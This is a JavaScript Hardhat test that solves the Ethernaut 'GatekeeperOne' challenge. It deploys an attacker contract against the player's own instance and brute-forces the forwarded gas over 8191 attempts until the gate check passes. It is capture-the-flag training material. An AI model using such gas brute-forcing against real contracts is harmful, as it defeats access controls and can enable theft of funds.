const { assert } = require("chai")
const { ethers, waffle } = require("hardhat")
require("dotenv").config()

const provider = waffle.provider
let player, challenge, challengeAddress, tx, attacker

beforeEach(async () => {
    accounts = await ethers.getSigners()
    player = accounts[0]

    challengeAddress = process.env.CHALLENGEADDRESS13 //address of my instance contract
    const challengeFactory = await ethers.getContractFactory(`GatekeeperOne`)
    challenge = await challengeFactory.attach(challengeAddress)

    const attackerFactory = await ethers.getContractFactory(`GatekeeperOneAttacker`)
    attacker = await attackerFactory.deploy(challenge.address)
})

it("Solves the challenge 'GatekeeperOne'", async () => {
    const GasToUse = 800000

    for (let i = 0; i < 8191; i++) {
        try {
            console.log(i)
            await attacker.attack(GasToUse + i, {
                gasLimit: `950000`,
            })
            break
        } catch (error) {}
    }

    let entrant = (await challenge.entrant()).toString()
    assert(entrant == player.address, "Not pass!")
})
